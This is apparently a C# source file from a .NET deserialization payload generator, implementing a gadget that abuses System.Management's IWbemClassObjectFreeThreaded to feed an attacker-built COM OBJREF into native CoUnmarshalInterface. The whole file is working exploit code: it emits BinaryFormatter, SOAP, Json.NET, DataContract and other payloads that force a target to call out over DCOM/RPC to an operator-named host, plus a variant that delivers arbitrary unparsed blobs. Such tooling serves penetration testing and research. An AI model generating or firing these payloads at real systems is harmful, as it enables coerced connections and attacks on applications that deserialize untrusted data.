using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.Serialization;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * WbemClassObjectUnmarshal: makes the TARGET hand attacker bytes to native COM
     * unmarshalling, and with the default variant that means an outbound DCOM/RPC
     * connection to a host the operator names.
     *
     * System.Management.IWbemClassObjectFreeThreaded (System.Management.dll) is internal,
     * sealed, [Serializable] and ISerializable. Its serialization constructor reads ONE
     * member and immediately calls into ole32:
     *
     *   IWbemClassObjectFreeThreaded(SerializationInfo, StreamingContext)
     *     -> info.GetValue("flatWbemClassObject", typeof(byte[]))
     *     -> DeserializeFromBlob(rg)
     *          -> Marshal.AllocHGlobal / Marshal.Copy      (the blob into unmanaged memory)
     *          -> CreateStreamOnHGlobal                    (wrapped as an IStream)
     *          -> CoUnmarshalInterface(stream, IID_IWbemClassObject)
     *
     * So the whole payload is one byte[] whose content is a COM OBJREF.
     *
     * THE TWO VARIANTS ARE NOT TWO EFFECTS. Both do the identical thing to the target -
     * hand a byte[] to CoUnmarshalInterface - and differ only in who writes those bytes:
     *
     *   variant 1  ysonet writes them. You give a host name, ysonet builds an
     *              OBJREF_STANDARD naming it, and the target calls out to that host. This
     *              is the one with a proven, classified effect.
     *   variant 2  you write them. ysonet reads your file and ships it byte for byte
     *              without parsing it, so the effect is whatever your bytes mean.
     *
     * Variant 2 is an escape hatch, NOT an escalation of variant 1 and NOT a code-execution
     * variant. It exists because some blobs cannot be expressed as a host name (an
     * OBJREF_CUSTOM, for instance), and it gives you the delivery channel only. If your
     * blob happens to be an OBJREF_STANDARD, variant 2 calls out exactly like variant 1;
     * ysonet has no way to know, which is precisely why variant 2 claims no effect at all.
     *
     * WHY THE DEFAULT VARIANT IS A NETWORK PAYLOAD. An OBJREF_STANDARD ([MS-DCOM] 2.2.18)
     * carries a DUALSTRINGARRAY of RPC string bindings and an OXID identifying the object
     * exporter. When the OXID is not already in the target's local table, the COM runtime
     * must ask the named host to resolve it, so it RESOLVES THE HOST NAME and CONNECTS to
     * it before it can fail. That is the effect this gadget sells, and it was measured
     * rather than assumed:
     *
     *   binding 127.0.0.1     -> 0x80070776 OR_INVALID_OXID, i.e. a COMPLETED RPC round
     *                            trip: it connected, called the resolver, and was told the
     *                            object exporter does not exist
     *   binding 10.255.255.1  -> 0x800706BA RPC_S_SERVER_UNAVAILABLE after a delay, i.e. an
     *                            outbound connection that timed out
     *   a host NAME           -> A and AAAA lookups recorded in the OS resolver cache, which
     *                            were absent before the run
     *
     * TWO THINGS THAT SURPRISE PEOPLE, both learned the hard way:
     *
     *  - THE PORT IS NOT YOURS TO CHOOSE. A string binding may carry an endpoint in
     *    brackets, but OXID resolution ignores it and always talks to the well known RPC
     *    port 135. A binding of "127.0.0.1[18136]" never reached a listener bound to 18136;
     *    it just failed as an unusable binding. That is why -c takes a bare host and why
     *    this gadget refuses a value with a port in it instead of building a payload that
     *    quietly cannot fire.
     *  - CAPTURING A REAL BLOB DOES NOT GIVE YOU THIS. Marshalling a live IWbemClassObject
     *    produces an OBJREF_CUSTOM (flags 0x04, custom marshaler CLSID
     *    4590f812-1d3a-11d0-891f-00aa004b2e24) that carries the whole WMI object BY VALUE
     *    and names no host at all. The published research on this type went that way and
     *    ended up in native OBJREF_CUSTOM memory corruption. The OBJREF_STANDARD below is
     *    built here from scratch precisely because no captured blob provides it.
     *
     * WHAT IS NOT CLAIMED. The OXID resolver call is not authenticated, so this is a
     * connection and coercion primitive. It is NOT evidence of NTLM coercion, relay, or any
     * form of code execution, and nothing here should be described that way.
     *
     * LOCAL SAFETY. The generator NEVER constructs the target: doing so runs the very
     * constructor that calls CoUnmarshalInterface, inside ysonet.exe. An inert ISerializable
     * marshal carries the type for the runtime formatters, and the three remaining formats
     * are hand written documents. For the same reason -t is REFUSED rather than ignored, for
     * both variants: a self-test deserializes here, which would make THIS machine do the
     * callback (variant 1) or hand the operator's own bytes to native COM (variant 2).
     */
    public class WbemClassObjectUnmarshalGenerator : GenericGenerator
    {
        // Public so the tests can name the exact type and members instead of repeating the
        // literals (same reason TempFileCollectionGenerator's constants are public).
        public const string WbemClrName = "System.Management.IWbemClassObjectFreeThreaded";
        public const string WbemAssemblyName =
            "System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";
        public const string WbemTypeName = WbemClrName + ", " + WbemAssemblyName;

        // The one member the serialization constructor reads. Spelled out because the whole
        // gadget is this single name plus the bytes behind it.
        public const string BlobMemberName = "flatWbemClassObject";

        // The data contract namespace DataContractSerializer derives for the target's CLR
        // namespace. Only the DataContractSerializer document needs it.
        public const string WbemContractNamespace =
            "http://schemas.datacontract.org/2004/07/System.Management";

        public const int VariantHostObjRef = 1;
        public const int VariantPreparedBlob = 2;

        // Canonical long name of the variant selector, so the generator, its help and the
        // tests cannot drift apart.
        public const string VariantOptionName = "variant";

        // A prepared blob is operator data with no upper bound of its own, and every text
        // formatter base64s it into the payload, so a careless input would produce a
        // multi-megabyte payload for no reason. Real marshalled WMI objects are tens of
        // kilobytes; 1 MiB leaves generous room and still fails fast on a wrong file.
        public const int MaxPreparedBlobBytes = 1024 * 1024;

        private int variantNumber = VariantHostObjRef;

        // ---- Metadata ----------------------------------------------------------

        // Discovery facets (category search only). The gadget default is variant 1, whose
        // proven effect is an outbound DCOM/RPC connection, so the gadget declares Network.
        // Variant 2 overrides the whole set: what a prepared blob does is decided by the
        // operator's bytes, not by this code, so it must not inherit the Network claim.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // System.Management and this type predate CLR v4, but 4.0 is the floor this
                // project records (see RuntimeVersion); fired on 4.8.1.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        // The type and its CoUnmarshalInterface path were identified by James Forshaw's
        // .NET serialization work; SCRT's ".NET serialiception" demonstrated reaching it
        // through BinaryFormatter. The OBJREF_STANDARD network use below is not from either
        // source - both went towards OBJREF_CUSTOM - so it is credited as a contribution.
        public override string Finders()
        {
            return "James Forshaw, SCRT";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        // Two short sentences: this is the FIRST block of the interactive info panel and a
        // long one pushes the formatter, command-input and category lines off the screen.
        // The port rule, the OBJREF shapes and the -t refusal live in the option help.
        public override string AdditionalInfo()
        {
            return "Feeds a serialized byte[] to native CoUnmarshalInterface. Variant 1 calls "
                + "out to your host on RPC 135; variant 2 ships a blob you built.";
        }

        public override List<string> Labels()
        {
            // Independent: it owns its whole chain and serializes a framework type of its
            // own. Not Hidden: the effect is classified and reproducible, so it belongs in
            // normal search next to the other network gadgets.
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter that can drive an ISerializable CONSTRUCTOR, and only those.
        //
        // That constructor is the whole gadget: DeserializeFromBlob is called from nowhere
        // else, and `flatWbemClassObject` is a plain parameter of it, not a field or a
        // property. So a serializer that rebuilds objects by setting members BY NAME can
        // never fire this, however well it can name the type. That rules out Xaml,
        // XmlSerializer, JavaScriptSerializer, YamlDotNet, FastJson, both SharpSerializer
        // modes and both MessagePack typeless flavours - and it is the exact opposite of
        // DataViewManagerXxe, whose sink IS a property setter and where those serializers
        // are the ones that work.
        //
        // DataContractJsonSerializer is the one ISerializable-aware format that still fails:
        // it cannot express a byte[] for an ISerializable member. A base64 string comes back
        // as "Invalid cast from 'System.String' to 'System.Byte[]'" and an array of numbers
        // as "Object must implement IConvertible", both before the constructor body runs.
        //
        // Each formatter below was proven by reaching CoUnmarshalInterface, not by
        // generating: see WbemClassObjectUnmarshalReachesTheComSink in ysonet.Tests.
        //
        // The "(2)" suffix is a display-only annotation meaning "this formatter carries 2
        // variants". Both variants differ only in where the blob comes from, so every
        // formatter carries both and none of them narrows the list.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter + " (2)",
                Formatters.SoapFormatter + " (2)",
                Formatters.LosFormatter + " (2)",
                Formatters.NetDataContractSerializer + " (2)",
                Formatters.DataContractSerializer + " (2)",
                Formatters.JsonNet + " (2)",
                Formatters.FsPickler + " (2)",
            };
        }

        // -c is a host the TARGET connects to. Nothing is resolved or contacted here.
        // Variant 2 overrides it with a file this machine reads while building.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.HostName;
        }

        public override List<GadgetVariant> Variants()
        {
            // The two variants take genuinely different -c inputs, so each declares its own
            // and the wizard prompts for the right thing. Both produce the same wire shape
            // (one byte[] member), so neither narrows the formatter list.
            return new List<GadgetVariant>
            {
                new GadgetVariant(VariantHostObjRef,
                        "Call out to a host: ysonet builds the OBJREF for you from -c <host> (default)",
                        CommandInputType.HostName)
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Network)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
                new GadgetVariant(VariantPreparedBlob,
                        "Bring your own blob: ship the file in -c byte for byte - NOT a code-execution variant",
                        CommandInputType.FilePath)
                    // The operator's bytes decide what happens, so this variant claims no
                    // network effect. Repeating the versions is required: an override
                    // replaces the WHOLE facet set. Inputs are deliberately left to derive
                    // from this variant's own CommandInputType.FilePath (giving local-file),
                    // because the accepted form is exactly the derived one.
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.Other)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|" + VariantOptionName + "=",
                    "Which blob to put in the payload. BOTH variants do the same thing to the "
                        + "target - hand a byte[] to native CoUnmarshalInterface - and differ "
                        + "only in WHO writes those bytes: variant 1 writes them for you from a "
                        + "host name, variant 2 ships a file you wrote yourself. Neither one is "
                        + "a code-execution variant. Choices:\r\n"
                        + "1 (default) - build an OBJREF_STANDARD here from -c \"<host>\". The "
                        + "target resolves that host and connects to it to resolve the OXID, "
                        + "which is the callback. Give a BARE host name or IP: the RPC endpoint "
                        + "inside a string binding is ignored and resolution always goes to port "
                        + "135, so \"host[1234]\" or \"host:1234\" is refused rather than shipped "
                        + "as a payload that cannot fire. The call is not authenticated, so this "
                        + "proves a connection, not NTLM coercion. It always ends in a COM error "
                        + "on the target (OR_INVALID_OXID when the host answers, "
                        + "RPC_S_SERVER_UNAVAILABLE when it does not) - the callback has already "
                        + "happened by then. -t is accepted here and behaves as it does on the "
                        + "other network gadgets: it deserializes the payload on THIS machine, "
                        + "so YOUR machine makes the callback. Use it to check the payload and "
                        + "your listener, and add --debugmode to see the COM error it ends "
                        + "with.\r\n"
                        + "2 (research) - read a prepared OBJREF from the local file named by -c "
                        + "and ship it as is. The file must be readable, non-empty and at most "
                        + MaxPreparedBlobBytes + " bytes. This is an escape hatch, not a stronger "
                        + "version of variant 1: ysonet does not parse, validate or understand "
                        + "your bytes, so the effect is entirely whatever they mean to "
                        + "CoUnmarshalInterface on the target - which may be nothing, a callout "
                        + "of your own design, or a crash. It does NOT by itself give code "
                        + "execution; it only gives you the delivery channel. Use it when you "
                        + "have built a blob variant 1 cannot express, such as an OBJREF_CUSTOM. "
                        + "-t is REFUSED for this variant, because self-testing would feed your "
                        + "unparsed bytes to native COM on this machine.",
                    v => int.TryParse(v, out variantNumber)
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // FIRST, before anything that could serialize or deserialize: variant 2 must never
            // reach a self-test. Variant 1 is allowed one and behaves like every other network
            // gadget under -t. See RefuseSelfTest for the reasoning.
            RefuseSelfTest(inputArgs);
            GuardVariantFormatter(variantNumber, formatter);

            byte[] blob = BuildBlob(inputArgs);
            string base64 = Convert.ToBase64String(blob);

            object payload;
            if (IsFormatter(formatter, Formatters.DataContractSerializer)
                || IsFormatter(formatter, Formatters.JsonNet)
                || IsFormatter(formatter, Formatters.FsPickler))
                // FinishHandWrittenPayload shrinks the document for its own format and, with
                // -t, reads it back with the serializer the target would use - which for
                // variant 1 performs the callback from this machine, exactly as -t does on
                // the other network gadgets.
                payload = FinishHandWrittenPayload(BuildHandWrittenPayload(formatter, base64),
                    formatter, inputArgs);
            else if (IsFormatter(formatter, Formatters.BinaryFormatter)
                || IsFormatter(formatter, Formatters.SoapFormatter)
                || IsFormatter(formatter, Formatters.LosFormatter)
                || IsFormatter(formatter, Formatters.NetDataContractSerializer))
                // -t is refused above, so Serialize has no side effect and the payload can be
                // built once and returned. The marshal below carries the type; unlike
                // TempFileCollection this needs no separate DataContract shape for
                // NetDataContractSerializer, because the TARGET itself is ISerializable and
                // so the marshal's member layout is already the one it expects.
                payload = Serialize(new WbemClassObjectMarshal(blob), formatter, inputArgs);
            else
                throw UnsupportedFormatter(formatter);

            RequireBlobArrivesIntact(payload, formatter, base64);
            return payload;
        }

        // ---- The blob ----------------------------------------------------------

        private byte[] BuildBlob(InputArgs inputArgs)
        {
            if (variantNumber == VariantHostObjRef)
                return BuildStandardObjRef(RequireHost(inputArgs));
            if (variantNumber == VariantPreparedBlob)
                return ReadPreparedBlob(inputArgs);

            throw new ArgumentException(Name() + " has no variant " + variantNumber
                + ". Use --" + VariantOptionName + " " + VariantHostObjRef + " (build an OBJREF "
                + "from a host) or --" + VariantOptionName + " " + VariantPreparedBlob
                + " (ship a prepared blob file).");
        }

        // An OBJREF_STANDARD, laid out field by field as [MS-DCOM] 2.2.18 defines it. It is
        // built here rather than captured because a marshalled IWbemClassObject is an
        // OBJREF_CUSTOM that names no host (see the header comment).
        //
        // Internal and static so the tests can build one and read it back without going
        // anywhere near the target type.
        internal static byte[] BuildStandardObjRef(string host)
        {
            var body = new MemoryStream();
            var w = new BinaryWriter(body);

            w.Write(ObjRefSignature);                    // 'MEOW'
            w.Write(ObjRefStandard);                     // flags: this is a STANDARD objref
            w.Write(IidWbemClassObject.ToByteArray());   // the interface being marshalled

            // STDOBJREF. The OXID is what makes this a network payload: the target looks it
            // up locally, does not find it, and therefore has to ask the host below to
            // resolve it. The three identifiers are fixed, not random, so the same host
            // always produces the same bytes (the tests assert exact output). Colliding with
            // a live local OXID would only mean the callback does not happen; it cannot make
            // the payload do anything else.
            w.Write((uint)0);                            // STDOBJREF.flags
            w.Write((uint)1);                            // cPublicRefs
            w.Write(PlaceholderOxid);
            w.Write(PlaceholderOid);
            w.Write(PlaceholderIpid.ToByteArray());

            // DUALSTRINGARRAY: the string bindings (where to resolve the OXID), then the
            // security bindings. Each array is terminated by a single zero USHORT, and both
            // counts below are measured in USHORTs, which is why the array is built first.
            var sa = new MemoryStream();
            var sw = new BinaryWriter(sa);
            sw.Write(TowerIdNcacnIpTcp);
            sw.Write(Encoding.Unicode.GetBytes(host));
            sw.Write((ushort)0);                         // end of this STRINGBINDING
            sw.Write((ushort)0);                         // end of the string binding array
            int securityOffsetInShorts = (int)sa.Length / 2;
            sw.Write(RpcAuthnWinNt);
            sw.Write(RpcAuthzNone);
            sw.Write((ushort)0);                         // empty principal name
            sw.Write((ushort)0);                         // end of the security binding array
            byte[] stringArray = sa.ToArray();

            w.Write((ushort)(stringArray.Length / 2));   // wNumEntries
            w.Write((ushort)securityOffsetInShorts);     // wSecurityOffset
            w.Write(stringArray);

            return body.ToArray();
        }

        private const uint ObjRefSignature = 0x574F454D;  // "MEOW"
        private const uint ObjRefStandard = 0x00000001;
        private const ushort TowerIdNcacnIpTcp = 0x0007;
        private const ushort RpcAuthnWinNt = 0x000A;
        private const ushort RpcAuthzNone = 0xFFFF;
        private const ulong PlaceholderOxid = 0x1122334455667788;
        private const ulong PlaceholderOid = 0x99AABBCCDDEEFF00;
        private static readonly Guid IidWbemClassObject =
            new Guid("DC12A681-737F-11CF-884D-00AA004B2E24");
        private static readonly Guid PlaceholderIpid =
            new Guid("11111111-2222-3333-4444-555555555555");

        // ---- Input handling ----------------------------------------------------

        // A BARE host name or IP. Nothing is resolved or contacted here: this only refuses
        // the forms that would build a payload which silently cannot fire.
        private string RequireHost(InputArgs inputArgs)
        {
            string host = inputArgs == null ? null : inputArgs.Cmd;
            if (string.IsNullOrEmpty(host) || host.Trim().Length == 0)
                throw new ArgumentException(Name() + " needs -c \"<host>\", the host the TARGET "
                    + "should connect to. Use a bare host name or IP, with no scheme and no port.");

            host = host.Trim();

            if (host.IndexOf("://", StringComparison.Ordinal) >= 0)
                throw new ArgumentException(Name() + " needs a bare host, not a URL. Drop the "
                    + "scheme and any path: \"attacker.example.com\", not \"" + host + "\".");

            if (host.IndexOf('\\') >= 0 || host.IndexOf('/') >= 0)
                throw new ArgumentException(Name() + " needs a bare host, not a path. Give just "
                    + "the host part: \"attacker.example.com\", not \"" + host + "\".");

            foreach (char c in host)
                if (char.IsWhiteSpace(c))
                    throw new ArgumentException(Name() + " needs a host with no whitespace in it, "
                        + "but got \"" + host + "\".");

            // Both port spellings are refused rather than stripped. OXID resolution ignores
            // the endpoint in a string binding and always uses RPC port 135, so accepting a
            // port would promise something the payload cannot do. ':' is still allowed when
            // the whole value is an IPv6 literal, which is an address and not a port.
            if (host.IndexOf('[') >= 0 || host.IndexOf(']') >= 0)
                throw new ArgumentException(Name() + " cannot target a specific port. OXID "
                    + "resolution always uses RPC port 135 and ignores the endpoint in a string "
                    + "binding, so \"" + host + "\" would build a payload that never calls out. "
                    + "Pass the host on its own.");

            if (host.IndexOf(':') >= 0 && !IsIPv6Literal(host))
                throw new ArgumentException(Name() + " cannot target a specific port. OXID "
                    + "resolution always uses RPC port 135, so drop the \":\" part of \""
                    + host + "\" and pass the host on its own.");

            return host;
        }

        private static bool IsIPv6Literal(string value)
        {
            IPAddress parsed;
            return IPAddress.TryParse(value, out parsed)
                && parsed.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
        }

        // Variant 2. The file is read on THIS machine while building; its contents are
        // shipped byte for byte and are never parsed, validated or understood here.
        private byte[] ReadPreparedBlob(InputArgs inputArgs)
        {
            string path = inputArgs == null ? null : inputArgs.Cmd;
            if (string.IsNullOrEmpty(path) || path.Trim().Length == 0)
                throw new ArgumentException(Name() + " variant " + VariantPreparedBlob
                    + " needs -c \"<path to an OBJREF file>\", a file on THIS machine.");

            path = path.Trim();
            if (!File.Exists(path))
                throw new ArgumentException(Name() + " cannot read \"" + path + "\": no such file "
                    + "on this machine. Variant " + VariantPreparedBlob + " reads the blob HERE "
                    + "while building the payload.");

            var info = new FileInfo(path);
            if (info.Length == 0)
                throw new ArgumentException(Name() + " will not ship an empty blob: \"" + path
                    + "\" is 0 bytes, and the target would fail before reaching the COM call.");

            if (info.Length > MaxPreparedBlobBytes)
                throw new ArgumentException(Name() + " refuses \"" + path + "\": it is "
                    + info.Length + " bytes and the limit is " + MaxPreparedBlobBytes
                    + ". Every text formatter base64s the blob into the payload, so a large "
                    + "file produces a payload nothing will accept. A marshalled WMI object is "
                    + "normally tens of kilobytes.");

            return File.ReadAllBytes(path);
        }

        // ---- Hand written documents --------------------------------------------

        // The three formats with no object graph. Each is emitted RAW here; shrinking and the
        // -t read-back both happen in FinishHandWrittenPayload.
        private string BuildHandWrittenPayload(string formatter, string base64)
        {
            if (IsFormatter(formatter, Formatters.DataContractSerializer))
                return BuildDataContractPayload(base64);
            if (IsFormatter(formatter, Formatters.JsonNet))
                return BuildJsonNetPayload(base64);
            if (IsFormatter(formatter, Formatters.FsPickler))
                return BuildFsPicklerPayload(base64);
            throw UnsupportedFormatter(formatter);
        }

        // DataContractSerializer carries no type information, so the consumer supplies the
        // root type and the document is read against THAT type's contract. The target is
        // ISerializable, so its contract is its members in NO namespace, each carrying its
        // own xsi type - which is why flatWbemClassObject declares xmlns="" and
        // i:type="x:base64Binary". The <root type="..."> envelope is this project's usual
        // way of stating the root type a real consumer would have fixed in its own code.
        private string BuildDataContractPayload(string base64)
        {
            return @"<root type=""" + WbemTypeName + @"""><" + WbemBareTypeName
                + @" xmlns=""" + WbemContractNamespace + @""" "
                + @"xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" "
                + @"xmlns:x=""http://www.w3.org/2001/XMLSchema""><" + BlobMemberName
                + @" i:type=""x:base64Binary"" xmlns="""">" + base64 + @"</" + BlobMemberName
                + @"></" + WbemBareTypeName + @"></root>";
        }

        // Json.NET reaches an ISerializable type's constructor when TypeNameHandling resolves
        // the type, so the document is hand written: Json.NET's own serializer would write
        // $type from the marshal's runtime type and ignore SerializationInfo.SetType.
        //
        // The member MUST be a base64 string. Json.NET reads a JSON array into the
        // SerializationInfo as an array and the constructor's GetValue(..., typeof(byte[]))
        // then fails, so neither [1,2,3] nor a $type/$values wrapper works.
        private string BuildJsonNetPayload(string base64)
        {
            return @"{
  ""$type"": """ + WbemTypeName + @""",
  """ + BlobMemberName + @""": """ + base64 + @"""
}";
        }

        // FsPickler's JSON form for an ISerializable object is a list of serializationEntries,
        // each naming the member, its type and its value. A byte[] entry is not a base64
        // string at this level: its Type is a "Array" case over System.Byte and its Value is
        // an object wrapping the base64. That shape was taken from what FsPickler itself
        // emits for the same member, not guessed.
        private string BuildFsPicklerPayload(string base64)
        {
            return @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
    ""_flags"": ""subtype"",
    ""subtype"": {
      ""Case"": ""NamedType"",
      ""Name"": """ + WbemClrName + @""",
      ""Assembly"": {
        ""Name"": ""System.Management"",
        ""Version"": ""4.0.0.0"",
        ""Culture"": ""neutral"",
        ""PublicKeyToken"": ""b03f5f7f11d50a3a""
      }
    },
    ""instance"": {
      ""serializationEntries"": [
        {
          ""Name"": """ + BlobMemberName + @""",
          ""Type"": {
            ""Case"": ""Array"",
            ""ElementType"": {
              ""Case"": ""NamedType"",
              ""Name"": ""System.Byte"",
              ""Assembly"": {
                ""Name"": ""mscorlib"",
                ""Version"": ""4.0.0.0"",
                ""Culture"": ""neutral"",
                ""PublicKeyToken"": ""b77a5c561934e089""
              }
            }
          },
          ""Value"": {
            ""Value"": """ + base64 + @"""
          }
        }
      ]
    }
  }
}";
        }

        // The bare type name, which is what an XML element is named after.
        private const string WbemBareTypeName = "IWbemClassObjectFreeThreaded";

        // ---- Blob fidelity ------------------------------------------------------

        // The blob is the entire payload, and for variant 1 the operator's host name lives
        // INSIDE it, so a payload whose base64 was rewritten is worse than no payload: it
        // still deserializes and simply calls nobody. Two things in this project rewrite text
        // in a payload (the XML minifier, and an XmlWriter's newline handling), so the rule
        // here is the same as TempFileCollection's: verify the emitted document, do not
        // predict which characters are at risk.
        //
        // Whitespace is removed from both sides before comparing because base64 is
        // whitespace-insensitive: every reader here ignores line breaks inside it, so a
        // wrapped value is intact, not corrupted. BinaryFormatter and LosFormatter carry the
        // byte[] as a length-prefixed record with no text encoding at all, so they are
        // skipped rather than checked against a base64 string they never contain.
        private void RequireBlobArrivesIntact(object payload, string formatter, string base64)
        {
            if (IsFormatter(formatter, Formatters.BinaryFormatter)
                || IsFormatter(formatter, Formatters.LosFormatter))
                return;

            string text = payload as string;
            if (text == null)
            {
                byte[] bytes = payload as byte[];
                if (bytes == null)
                    return;
                text = Encoding.UTF8.GetString(bytes);
            }

            if (StripWhitespace(text).IndexOf(StripWhitespace(base64), StringComparison.Ordinal) >= 0)
                return;

            throw new Exception(Name() + " did not carry its blob through " + formatter
                + " intact, so the payload would deserialize on the target and call nobody. "
                + "This is a bug in the gadget or in the minifier, not in your input; generate "
                + "without --minify, or use BinaryFormatter or LosFormatter, whose streams carry "
                + "the bytes unchanged.");
        }

        private static string StripWhitespace(string value)
        {
            var sb = new StringBuilder(value.Length);
            foreach (char c in value)
                if (!char.IsWhiteSpace(c))
                    sb.Append(c);
            return sb.ToString();
        }

        // ---- Local safety ------------------------------------------------------

        // -t deserializes the payload in THIS process, so it runs the target's serialization
        // constructor here. Whether that is acceptable depends entirely on WHOSE bytes are in
        // the blob, which is the one real difference between the two variants:
        //
        //  - variant 1 ships an OBJREF this file built, and the worst it does locally is make
        //    this machine perform the callback to the host the operator just typed. That is
        //    what -t means everywhere else in the project (DataViewManagerXxe fetches its DTD,
        //    PictureBox and InfiniteProgressPage load their URL), so it is ALLOWED. The
        //    project's test suite deserializes exactly this payload on every FULL run.
        //  - variant 2 ships the OPERATOR'S bytes, which nothing here has parsed or
        //    understood, straight into a native COM unmarshaller. That can crash the process
        //    or worse, and unlike the callback it is not an effect this file can predict, so
        //    it is REFUSED - the same line the project draws for AssemblyInstallerLoad, whose
        //    -t would load and run the supplied DLL.
        //
        // Refusing loudly (the exit code carries it) beats ignoring the flag, which would
        // imply that a self-test had validated something.
        private void RefuseSelfTest(InputArgs inputArgs)
        {
            if (inputArgs == null || !inputArgs.Test)
                return;
            if (variantNumber != VariantPreparedBlob)
                return;

            throw new ArgumentException(Name() + " refuses -t for variant " + VariantPreparedBlob
                + ". A self-test deserializes the payload in THIS process, which would hand YOUR "
                + "prepared bytes to native COM unmarshalling on this machine, and nothing here "
                + "has parsed them - the result could be a crash or worse. Variant "
                + VariantHostObjRef + " does accept -t, because the blob it ships is one ysonet "
                + "built and the only local effect is the callback to the host you named.");
        }
    }

    // Emits System.Management.IWbemClassObjectFreeThreaded without ever instantiating it.
    //
    // The target IS ISerializable, so the runtime formatters ask it for exactly one member
    // and hand that back to its serialization constructor. That is why this marshal needs
    // nothing else: no field list, and no separate DataContract shape for
    // NetDataContractSerializer (which is what TempFileCollection, a plain [Serializable]
    // type, did need).
    //
    // Internal on purpose: nothing outside this file should be able to hand a blob to a type
    // whose constructor calls into native COM.
    [Serializable]
    internal sealed class WbemClassObjectMarshal : ISerializable
    {
        private readonly byte[] _blob;

        internal WbemClassObjectMarshal(byte[] blob)
        {
            _blob = blob;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(Type.GetType(WbemClassObjectUnmarshalGenerator.WbemTypeName, true));
            info.AddValue(WbemClassObjectUnmarshalGenerator.BlobMemberName, _blob, typeof(byte[]));
        }
    }
}
